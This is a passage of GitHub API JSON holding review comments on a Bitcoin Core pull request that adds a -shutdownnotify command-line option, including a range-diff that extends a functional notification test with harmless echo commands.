            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/994362164"
         }
      },
      "author_association" : "MEMBER",
      "body" : "Might be best to keep as-is, to mirror the other notify command",
      "commit_id" : "fcc7cf75175769fb39d88bcb93d296e926d6913e",
      "created_at" : "2022-10-13T09:01:03Z",
      "diff_hunk" : "@@ -405,6 +421,7 @@ void SetupServerArgs(ArgsManager& argsman)\n     argsman.AddArg(\"-settings=<file>\", strprintf(\"Specify path to dynamic settings data file. Can be disabled with -nosettings. File is written at runtime and not meant to be edited by users (use %s instead for custom settings). Relative paths will be prefixed by datadir location. (default: %s)\", BITCOIN_CONF_FILENAME, BITCOIN_SETTINGS_FILENAME), ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n #if HAVE_SYSTEM\n     argsman.AddArg(\"-startupnotify=<cmd>\", \"Execute command on startup.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n+    argsman.AddArg(\"-shutdownnotify=<cmd>\", \"Execute command immediately before beginning shutdown. The need for shutdown may be urgent, so be careful not to delay it long (if the command doesn't require interaction with the server, consider having it fork into the background).\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r994362164",
      "id" : 994362164,
      "in_reply_to_id" : 890766905,
      "line" : 424,
      "node_id" : "PRRC_kwDOABII5847RMM0",
      "original_commit_id" : "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
      "original_line" : 424,
      "original_position" : 29,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 29,
      "pull_request_review_id" : 1140367171,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/994362164/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2022-10-13T09:01:03Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/994362164",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "Apologies for the delay. Added an additional functional test in the latest patch\r\n\r\n<details>\r\n<summary> git range-diff  fcc7cf7~2..fcc7cf7 d96d97a~2..d96d97a </summary>\r\n\r\n```diff\r\n1:  46790135b ! 1:  0bd73e2c4 util: Add -shutdownnotify option.\r\n@@ src/init.cpp: void SetupServerArgs(ArgsManager& argsman)\r\n  #endif\r\n  #ifndef WIN32\r\n      argsman.AddArg(\"-sysperms\", \"Create new files with system default permissions, instead of umask 077 (only effective with disabled wallet functionality)\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\r\n\r\n ## test/functional/feature_notifications.py ##\r\n@@ test/functional/feature_notifications.py: class NotificationsTest(BitcoinTestFramework):\r\n         self.num_nodes = 2\r\n         self.setup_clean_chain = True\r\n         # The experimental syscall sandbox feature (-sandbox) is not compatible with -alertnotify,\r\n-        # -blocknotify or -walletnotify (which all invoke execve).\r\n+        # -blocknotify, -walletnotify or -shutdownnotify (which all invoke execve).\r\n         self.disable_syscall_sandbox = True\r\n \r\n     def setup_network(self):\r\n@@ test/functional/feature_notifications.py: class NotificationsTest(BitcoinTestFramework):\r\n         self.alertnotify_dir = os.path.join(self.options.tmpdir, \"alertnotify\")\r\n         self.blocknotify_dir = os.path.join(self.options.tmpdir, \"blocknotify\")\r\n         self.walletnotify_dir = os.path.join(self.options.tmpdir, \"walletnotify\")\r\n+        self.shutdownnotify_dir = os.path.join(self.options.tmpdir, \"shutdownnotify\")\r\n+        self.shutdownnotify_file = os.path.join(self.shutdownnotify_dir, \"shutdownnotify.txt\")\r\n         os.mkdir(self.alertnotify_dir)\r\n         os.mkdir(self.blocknotify_dir)\r\n         os.mkdir(self.walletnotify_dir)\r\n+        os.mkdir(self.shutdownnotify_dir)\r\n \r\n         # -alertnotify and -blocknotify on node0, walletnotify on node1\r\n         self.extra_args = [[\r\n             f\"-alertnotify=echo > {os.path.join(self.alertnotify_dir, '%s')}\",\r\n             f\"-blocknotify=echo > {os.path.join(self.blocknotify_dir, '%s')}\",\r\n+            f\"-shutdownnotify=echo > {self.shutdownnotify_file}\",\r\n         ], [\r\n             f\"-walletnotify=echo %h_%b > {os.path.join(self.walletnotify_dir, notify_outputname('%w', '%s'))}\",\r\n         ]]\r\n@@ test/functional/feature_notifications.py: class NotificationsTest(BitcoinTestFramework):\r\n \r\n         # TODO: add test for `-alertnotify` large fork notifications\r\n \r\n+        self.log.info(\"test -shutdownnotify\")\r\n+        self.stop_nodes()\r\n+        self.wait_until(lambda: os.path.isfile(self.shutdownnotify_file), timeout=10)\r\n+\r\n     def expect_wallet_notify(self, tx_details):\r\n         self.wait_until(lambda: len(os.listdir(self.walletnotify_dir)) >= len(tx_details), timeout=10)\r\n         # Should have no more and no less files than expected\r\n2:  fcc7cf751 = 2:  d96d97ad3  doc: Add release note for shutdownnotify.\r\n```\r\n\r\n</details>",
      "created_at" : "2022-10-13T13:35:46Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-1277627003",
      "id" : 1277627003,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII585MJwp7",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1277627003/reactions"
      },
      "updated_at" : "2022-10-13T13:35:46Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1277627003",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   }
]
